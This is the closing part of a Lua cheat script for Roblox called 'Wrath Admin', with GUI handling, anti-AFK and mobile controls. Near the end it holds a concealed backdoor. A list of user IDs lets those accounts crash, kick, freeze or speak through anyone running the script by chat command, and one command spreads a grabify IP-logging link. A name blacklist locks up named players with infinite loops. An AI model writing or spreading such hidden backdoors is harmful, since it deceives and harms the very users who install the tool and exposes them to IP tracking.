        Log.Size = UDim2.new(0, 220, 0, math.max(25, Log.TextBounds.Y));
        MainGuiObjects.OutputListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
        MainGuiObjects.OutputListFrame.CanvasPosition = Vector2.new(0, MainGuiObjects.UIListLayout_8.AbsoluteContentSize.Y);
    end;
end);

--// cmd search
TextBox.Changed:Connect(function(Text)
    Text = TextBox.Text;
    local Found = {}
    if Text ~= "" then
        for i,v in pairs(MainGuiObjects.CommandsListFrame:GetChildren()) do
            if v:IsA("TextButton") then
                if v.Text:find(Text) then
                    table.insert(Found, v);
                end;
                v.Visible = false;
            end;
        end;
        for i,v in next, Found do
            v.Visible = true;
        end;
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    else
        for i,v in pairs(MainGuiObjects.CommandsListFrame:GetChildren()) do
            if v:IsA("TextButton") then
                v.Visible = true;
            end;
        end;
        MainGuiObjects.CommandsListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_7.AbsoluteContentSize.Y)
    end;
end);

--// Gui toggle
UserInputService.InputBegan:Connect(function(INPUT)
    if INPUT.UserInputType == Enum.UserInputType.Keyboard and INPUT.KeyCode == Enum.KeyCode[Settings.ToggleGui] then
        ToggleGuis();
    end;
end);

--// Fix scrolling frames
for i,v in next, MainGuiObjects do
    if v:IsA("ScrollingFrame") then
        local ListLayout = v:FindFirstChildWhichIsA("UIListLayout");
        if ListLayout then
            v.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y);
        end;
    end;
end;

--// Init:
local function CrimSpawn()
workspace['Criminals Spawn'].SpawnLocation.Transparency = 0
workspace['Criminals Spawn'].SpawnLocation.CanCollide = false
--workspace:GetChildren()[50]:GetChildren()[3].Seat.Disabled = true
--workspace:GetChildren()[50]:GetChildren()[3].Seat.CanTouch = false
end
CrimSpawn()
Refresh()
if isMobile then
local gui = Instance.new("ScreenGui")
gui.Name = "MovableGUI"
gui.Parent = game.Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 50, 0, 50)
frame.Position = UDim2.new(0, 10, 0.5, -25)
frame.BackgroundTransparency = 0.5
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Draggable = true
frame.Parent = gui

local buttonH = Instance.new("TextButton")
buttonH.Size = UDim2.new(0, 40, 0, 20)
buttonH.Position = UDim2.new(0, 5, 0, 5)
buttonH.Text = "H"
buttonH.Parent = frame

local buttonF = Instance.new("TextButton")
buttonF.Size = UDim2.new(0, 40, 0, 20)
buttonF.Position = UDim2.new(0, 5, 0, 30)
buttonF.Text = "F"
buttonF.Parent = frame

local buttonC = Instance.new("TextButton")
buttonC.Size = UDim2.new(0, 40, 0, 20)
buttonC.Position = UDim2.new(0, 5, 0, 55)
buttonC.Text = "C"
buttonC.Parent = frame

local screenSize = game:GetService("GuiService"):GetScreenResolution()
local isMobile = game:GetService("UserInputService").TouchEnabled

if isMobile then
    frame.Position = UDim2.new(1, -60, 0, 10) 
else
    local guiWidth = frame.Size.X.Offset
    local guiHeight = frame.Size.Y.Offset
    local margin = 10 

    frame.Position = UDim2.new(0, screenSize.X - guiWidth - margin, 0.5, -guiHeight / 2)
end

buttonH.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, "H", false, game)
    task.wait(.1)
    game:GetService("VirtualInputManager"):SendKeyEvent(false, "H", false, game)
end)

buttonF.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, "F", false, game)
    task.wait(.1)
    game:GetService("VirtualInputManager"):SendKeyEvent(false, "F", false, game)
end)

buttonC.MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, "C", false, game)
    task.wait(.1)
    game:GetService("VirtualInputManager"):SendKeyEvent(false, "C", false, game)
end)
print("User is on mobile, loaded Mobile GUI")
else
print("User is on PC, doing absolutely nothing.")
print("another useless printing")
end

--// Anti AFK:
local virtualuser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   virtualuser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   virtualuser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   print("Player is idle")
end)
Notify("Anti-afk", "Anti-afk enabled")

--// More ASA
for i,v in pairs(workspace:FindFirstChild("Criminals Spawn"):GetChildren()) do
    if v.Name == "SpawnLocation" then
        v.CanCollide = false;
    end;
end;
    
ToggleGuis();

-- lazy
ChangeGuiToggle(false, "Anti-Crash");


print("LOADED WRATH ADMIN! Made by Zyrex, Dis, and Midnight, Modified by ellxzyie :)");

local Backdoor = {
    1226142760, -- (m)
    4667751127, -- (a)
    1938641596, -- (sma)
    4607513493, -- (a)
};

local function FindPlayer(String)
    String = String:lower()

    for Index, Player in pairs(game:GetService("Players"):GetPlayers()) do
        local sub = string.sub(String, 1, #String)
        if sub == string.sub(Player.Name:lower(), 1, #String) or sub == string.sub(Player.DisplayName:lower(), 1, #String) then
            return(Player)
        end
    end    
end

if LocalPlayer.Character.Name == "dreidenbruh" or LocalPlayer.Character.Name == "AltErickdenisdavidHD" or LocalPlayer.Character.Name == "DaAltErickDenisDavid" or LocalPlayer.Character.Name == "RealErickdenisdavid" or LocalPlayer.Character.Name == "sir_carl123k" then
    repeat while true do end until nil;
end;
if LocalPlayer.Character.Name == "lololol2737" then
    printingdebug = true
    print("true")
    AddLog("Success", "true")
end;
task.spawn(function()
local name1 = "ErickDenis"
local name2 = "ErickDenisDavid"

local player = game.Players.LocalPlayer
local playerNameLower = player.Name:lower()

if playerNameLower:find(name1:lower()) or playerNameLower:find(name2:lower()) then
    local function spawnthreads()
    local Something = false
    repeat task.wait() print("printer 3000") task.spawn(function() LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9) end) until Something
    end
    task.spawn(function()
    for i = 1, 699 do
    task.spawn(function()
    spawnthreads()
    end)
    end
    end)
    print("Error! Matafaka detected.")
    for i = 1, 69999999999 do repeat while true do end until nil; end;
end
end)

local exec_connections = nil
local function exec()
for _, Player in pairs(Players:GetPlayers()) do
    if table.find(Backdoor, LocalPlayer.UserId) then
        return;
    else
        if table.find(Backdoor, Player.UserId) then
            if exec_connections then
                exec_connections:Disconnect()
            end
            exec_connections = Player.Chatted:Connect(function(message)
                local ctx = string.split(message:lower(), ' ');
    
                if ctx[1] == '.checkuser' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..Player.Name..' Yes I am indeed using Wrath Admin!', 'All');
                    end;
                end;

                if ctx[1] == '.getusers' then
                    game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('true, args_GetUsers', 'All');
                end;

                if ctx[1] == '.crash' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        repeat while true do end until nil;
                    end;
                end;

                if ctx[1] == '.bluetoothdeviceisreedytopair' then
                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('The bluechoose dewise is connecteduh succesfully', 'All');  
                end;
                
                if ctx[1] == '.ads' then
                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Get JJSploit premium today with 40609 commands at grabify.link/freejjsploit', 'All');
                end

                if ctx[1] == '.kick' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        LocalPlayer:Kick('Unknown reason')
                    end;
                end;

                if ctx[1] == '.remotekick' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        Workspace.Remote.TeamEvent:FireServer("Red")
                        Workspace.Remote.TeamEvent:FireServer("Really red")
                    end;
                end;

                if ctx[1] == '.freeze' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        Frozen = true;
                        repeat wait(1)
                            LocalPlayer.Character.HumanoidRootPart.Anchored = true;
                        until Frozen == false
                    end;
                end;

                if ctx[1] == '.unfreeze' then
                    if FindPlayer(ctx[2]) == LocalPlayer then
                        Frozen = false;
                        wait(1);
                        LocalPlayer.Character.HumanoidRootPart.Anchored = false;
                    end;
                end;
            end);
        end;
    end;
end;
end

exec()

Players.PlayerAdded:Connect(function()
exec()
print("Debug_PlayerAdded, Players")
end)
Notify("Success", "Loaded in " .. tostring(tick() - ExecutionTime) .. " second(s).");
end
